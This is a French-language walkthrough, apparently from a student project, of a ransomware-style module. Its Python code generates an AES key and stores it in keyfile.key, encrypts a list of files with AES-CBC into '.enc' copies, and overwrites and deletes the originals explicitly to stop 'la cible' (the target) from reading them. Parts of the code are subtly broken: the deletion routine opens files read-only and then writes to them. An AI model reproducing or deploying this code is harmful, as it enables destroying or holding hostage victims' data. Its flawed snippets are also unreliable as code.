## Chiffrement des fichiers

Le chiffrement des fichiers se fait par le module encrypt_files.

### Génération de la clé AES

Voici le module pour générer la clé AES.
Ici, nous utilisons la librairie PyCryptodome pour générer une suite de bytes aléatoires que nous allons utiliser comme clé de chiffrement.
Ensuite, nous enregistrons cette clé dans un fichier keyfile.key afin de pouvoir la réutiliser pour chiffrer les fichiers et ensuite déchiffrer les fichiers.


```python
def save_key(key, keyfile_path):
    """Cette fonction permet d'enregistrer la clé générer dans un fichier afin de pouvoir la
    partager et la réutiliser pour chiffrement et déchiffrement du dossier

    Args:
        key: clé secrète AES
        keyfile_path: le fichier dans lequel sera enregistrée la clé
    """
    with open(keyfile_path, 'wb') as keyfile:
        keyfile.write(key)
    print(f"Clé enregistrée dans {keyfile_path}.")
    
def generate_key():
    key = get_random_bytes(32)
    key_file_path = "keyfile.key"
    save_key(key, key_file_path)
```


### Récupération de la clé AES

Ici, nous tentons tout d'abord de récupérer la clé générée au préablable en indiquant le chemin du fichier dans lequel est enregistré la clé (keyfile.key).
La fonction load_key tente d'ouvrir et lire ce fichier.
Si la fonction échoue, afin d'éviter un crash du programme, nous générons et enregistrons une nouvelle clé grâce à la fonction generate_key du module generate_key.

```python
def load_key(keyfile_path):
    with open(keyfile_path, 'rb') as keyfile:
        return keyfile.read()

keyfile_path = "keyfile.key"       
try:
    key = load_key(keyfile_path)
except Exception as e:
    generate_key()
```

### Chiffrement des fichiers
Ici, nous chiffrons les fichiers grâce à une itération sur chaque fichier, qui est ensuite chiffré avec la fonction encrypt_file.

La fonction encrypt_file prend en paramètres le chemin du fichier et la clé de chiffrement.
Nous ouvrons d'abord le fichier avec python en mode binaire (c'est la signification de l'option 'rb').
C'est important d'ouvrir le fichier en mode binaire parce qu'AES ne peut chiffrer que des octets et non du texte. Nous enregistrons ainsi le contenu du fichier sous forme de bytes dans la variable file_data.
Ensuite nous créons un nouveau object AES de la lirairie PyCryptodome en mode CBC (Cipher Block Chaining), qui doit nous permettre de chiffrer le fichier.

Explication des fonctions de la librairie : 

pad()
Le padding est nécessaire parce qu'AES travaille avec des blocs de taille fixe (16 octets pour AES). Si les données du fichier ne sont pas un multiple de la taille de bloc, la fonction pad ajoute des octets supplémentaires pour compléter le dernier bloc.

cipher.iv
Le mode CBC nécessite un vecteur d'initialisation (IV) pour fonctionner. Il est ajouté au début du texte chiffré. L'IV permet une part d'aléatoire au chiffrement.

Aisni, la fonction encrypt_file retourne une combinaison du vecteur d'initialisation (cipher.iv), qui occupe les 16 premiers octets et du texte chiffré (cipher.encrypt(...)) qui suit.

```python
def encrypt_file(file_path, key):
    with open(file_path, 'rb') as f:
        file_data = f.read()
    cipher = AES.new(key, AES.MODE_CBC)
    ciphertext = cipher.iv + cipher.encrypt(pad(file_data, AES.block_size))
    return ciphertext

encrypted_files = {}
for file_path in files_to_encrypt:
    ciphertext = encrypt_file(file_path, key)
    encrypted_file_path = file_path + ".enc"
    with open(encrypted_file_path, 'wb') as f:
        f.write(ciphertext)
    encrypted_files[file_path] = encrypted_file_path
```

### Suppression des fichiers originaux pour empêcher la lecture

Enfin, nous supprimons les fichiers d'origine pour empêcher la lecture par la cible.
D'abord, nous récupérons la taille du fichier en octets (nombre total d'octets dans le fichier).
Cette information est nécessaire pour savoir combien de données aléatoires doivent être écrites pour écraser complètement le fichier. 
os.urandom(file_size) génère ensuite une séquence d'octets aléatoires de longueur égale à file_size.
Ces octets sont cryptographiquement sûrs, ce qui rend leur récupération extrêmement difficile. Puis, f.write écrit les octets générés directement dans le fichier, remplaçant son contenu existant. Cela garantit que l'ancien contenu est écrasé avant que le fichier ne soit supprimé.
os.remove(file_path) supprime enfin le fichier du système de fichiers après écrasement de son contenu.


```python
def secure_delete(file_path):
    try:
        with open(file_path, 'rb') as f:
            file_size = os.path.getsize(file_path)
            f.write(os.urandom(file_size))
        os.remove(file_path)
    except Exception as e:
        print(f"Erreur lors de la suppression sécurisée de {file_path}: {e}")
        
secure_delete(file_path)
```
